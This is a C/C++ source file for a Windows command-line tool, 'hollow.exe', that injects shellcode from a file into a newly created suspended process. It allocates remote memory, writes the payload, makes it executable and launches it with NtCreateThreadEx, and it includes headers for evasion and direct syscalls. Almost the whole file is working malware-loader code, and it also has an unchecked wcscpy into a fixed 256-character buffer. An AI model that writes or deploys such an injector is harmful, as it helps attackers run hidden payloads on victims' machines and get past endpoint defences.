#include "hollow.h"
#include "evasion.h"
#include "syscalls.h"
#include "config.h"
#include <windows.h>
#include <stdio.h>


BOOL LoadShellcode(const wchar_t* path, PBYTE* ppBuffer, SIZE_T* pSize);
void PrintError(const char* msg);


BOOL UnhookNtdll() {
    return TRUE; 
}

BOOL HollowProcess(const wchar_t* target, PBYTE pShellcode, SIZE_T shellcodeSize) {
    if (!UnhookNtdll()) {
        printf("[!] Failed to unhook ntdll\n");
        return FALSE;
    }

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcessW(target, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        PrintError("CreateProcess");
        return FALSE;
    }

   
    PVOID pRemoteImageBase = NULL;
    if (NtAllocateVirtualMemory(pi.hProcess, &pRemoteImageBase, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != 0) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    
    if (NtWriteVirtualMemory(pi.hProcess, pRemoteImageBase, pShellcode, shellcodeSize, NULL) != 0) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    
    DWORD oldProtect = 0;
    if (!VirtualProtectEx(pi.hProcess, pRemoteImageBase, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect)) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    
    HANDLE hNewThread = NULL;
    NTSTATUS status = NtCreateThreadEx(&hNewThread, GENERIC_EXECUTE, NULL, pi.hProcess, pRemoteImageBase, NULL, 0, 0, 0, 0, NULL);
    if (status != 0) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    
    CloseHandle(hNewThread);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return TRUE;
}

extern "C" {
    int wmain(int argc, wchar_t* argv[]) {
        
        if (argc != 5 || wcscmp(argv[1], L"--target") != 0 || wcscmp(argv[3], L"--payload") != 0) {
            printf("Usage: hollow.exe --target <process.exe> --payload <shellcode.bin>\n");
            fflush(stdout);
            return 1;
        }

       
        wchar_t target[256] = { 0 };
        wcscpy(target, argv[2]); 

        wchar_t* payloadPath = argv[4];

        PBYTE pShellcode = NULL;
        SIZE_T shellcodeSize = 0;
        
        printf("[*] Attempting to load shellcode from file...\n");
        fflush(stdout);
        if (!LoadShellcode(payloadPath, &pShellcode, &shellcodeSize)) {
            printf("[!] Failed to load shellcode binary file!\n");
            fflush(stdout);
            return 1;
        }

        printf("[*] Loaded shellcode size: %d bytes\n", (int)shellcodeSize);
        printf("[*] Launching low-level system call injection utility...\n");
        fflush(stdout);

        if (!HollowProcess(target, pShellcode, shellcodeSize)) {
            printf("[!] Native injection routine failed!\n");
            fflush(stdout);
            VirtualFree(pShellcode, 0, MEM_RELEASE);
            return 1;
        }

        printf("[+] System call injection successfully executed!\n");
        fflush(stdout);
        VirtualFree(pShellcode, 0, MEM_RELEASE);
        return 0;
    }
}
